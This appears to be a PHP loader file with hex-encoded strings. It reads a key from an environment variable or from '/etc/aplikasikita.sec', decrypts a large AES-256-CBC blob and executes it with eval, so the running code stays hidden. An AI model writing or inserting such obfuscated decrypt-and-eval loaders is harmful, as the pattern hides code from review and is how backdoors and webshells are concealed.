<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TK+4GbqTg424fcV0jVRPqQ==');

$c=base64_decode(

'm7KFLlFDjN2kd5K2m7K0wBDlxk+RCXVAzbgYcEYEVcqhuiivRygXZuKKIiPEAu5af/z3f9W0KQoW' .
'k1TIiZIIRu0vuw3k1xBaia8OyvcWCFlovxs2Hs6/ibyLuzzTR/sE4r+OOnywagSVf55o4dDrj3ow' .
'umRRaAtn+UYb/c45gktuwb9Z+wuCrchxuD2ypoc/YEXvJMdvQpRDsFYCdV5cgPeIHf3VjyMOEEb0' .
'UBnDMAuW3eEh2WogpSga3EuLSOBBYSBSN+9FVDjszvdWF/UiAYuyizcmexB4shFUsNu+pq+gqQ3q' .
'U99gkHvbERnMaE8+gFjY83OXTaJ8rqCZvyAVoSGWpU7vXiljoxT3GnTYxKh5B0+7svcBhgpDRzHg' .
'9SSEJsqTeDAegcl/o3whoA8FWmmb4Z3vpdDRlRtLRocv6Xfo7IDDW0jNcH1nyZt+BKOlWtXciwFj' .
'QOj7evQByZHHxO7LpqFcOHMxhpBk/WlHvGz/bOrly67c2/dYW51y7TshitnArJqWqAAkrng/wg8w' .
'QnLoOdlmE2Vhk82FQkvBYEnR6T9KH9kVfTlnY4K2JWVDIhUuvIz0P2KCc/LfQkhaFUooIUV2gTUD' .
'qXkvttRFisPJ6ITVP6gu6nq8iXcfVhEssnhGdGBSSQbq/dlsKFHR1GMVNdWiksWJRSPet7ippZdy' .
'dQGAw5X4GArzNmCC/SNP4io6W8GUnnxuE2LPTUVbs0E/9lfIOlEB8VYanI5BgU+KvkP2WIDHVxXT' .
'a/fePpudtp4gFFzoIwi7oPtzudLWAF1jwt2bz4rdb21VFWbPb5E8OMSJByx4x64jPg0x+TBZyYzE' .
'fJyg2vIx0Aax3olHWE4bqCrlBxrOixZH/fss9YJBt1nXAKq1Xnc0il/ZE92DuhlCsddfbYvg5mPQ' .
'nR6XHkOyiXlSx8m7AAgH0hZo/pCQefJsjOxnVoRxBaNdoBWqQf1yply91+X/d/uryMHfEuuAuKAw' .
'rHEUNP5CMqVnjN4rtG4E17oaXDg8nrGuuPupCMOeznJWQUH/V6oBrC1F3MC7oeBG9kOfEWUI4ELK' .
'kEdb7qFpJxyIFQSSlq/kIaBLDix0dCIAtjV+beoNjWsnu0PPN9Actnfl0Y5JiyCNoSSVa5WF+Q3c' .
'nnQITzaK5pNrk+FkECC78sdl2Po6gAuriRh/FUQ81kKM62nSK0e1K7xHbxXFB0/abwVVRJNZ8n+6' .
'7QBvq8x7qeCYT1bqqyZLg09md6HhINtpMDnuygWlD/XktHutQNzpG6y+sAADYOOXoZzrsR6cMZ/O' .
'jtoKHSVTKUe/KR+3awl2eJDV0dNv1BKYSZfbWhPYcRGaqclMczW5FbSJQt8Nr/iz1EDmqmdyEMby' .
'xJF5xLV92FtTQrcoMpv+skeXnw2BjVZkiHdDxF4TcM4OTXvGa5ZlswNQOaL3NEmZb7KUdv/O2HW0' .
'f7VGZz3C9COxnelBflSbIJHLWQJZUV7y8IxahZrtRJVzyQ/QUoB8aqF7ktGIJ++0o3r8JxDccc3i' .
'PPuSuhsejtmSz6MzKBIm0/1e2IGUHTK6QR/wR7WprHogfPV/2OsAF7G0+ek4aT4vmvTMeOehYO2S' .
'sk3sKgvNAs8JhcE2tk20goiQ3MYPtdwqzFdiGXWV9smQa51BIeud75/tfh5J3duQvyPOzpN/GMVr' .
'FPTOC/WHJrspvqka0uhSKi5kX3T5S9/Re64dp2Miue96N2v1BVVHvVJzG39jfJ44Mrw4R69vsUWu' .
'vofm0BSTYO9HlHrQYn2pWS/ZDTVaLPYu91DTDVQE1vffNFlApQUePLAlPdkxcR8bcnFlrXAdYtC1' .
'+/NxYowR+VPLyZ9hGfH4tcTheq1QJzcs/LQEoQ+jARcqiEfZ/IEfvIpwTgXjUktwAHwjD4DeFFtv' .
'8WLuuLMCt2wvIpcrP5+qTEmujRIxgaDwIfuLx6rJlrifU/oRGL6NjcjmlkTv3NhY+R07AKiVkxHs' .
'P9E0UUWEUPRt8KEaDEvvUkxN55mRfj7c5ncgMg7EAn/EvAJlAxxIEu01DUvvobKVTZSpDXCLXYCp' .
'Hg+RvRy7zy7yTuliwSZIwBVoP6EkbbGCnDtbweZeXq3Dyl2J7Wa5r+t+5NqK/6vo2zze2Eedcpmi' .
'33ARCfghLIvj7eBrmXZmeo1gHsWgch+3gfA2WrF0XHNpo24DmKvlVA7NVwBBpIkWks6GGe2mOUlb' .
'UA04l2cQQj7HaM5al4O0DN0HL80c8z1ztxlDek0Lq03xc79hIO5y1/DdQee83gx5tzyt5DQkaU3y' .
'LCTK3VDo0smTc/8ij/CiyYldBCCX0Bz4ObrA6wXzUl1SmQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

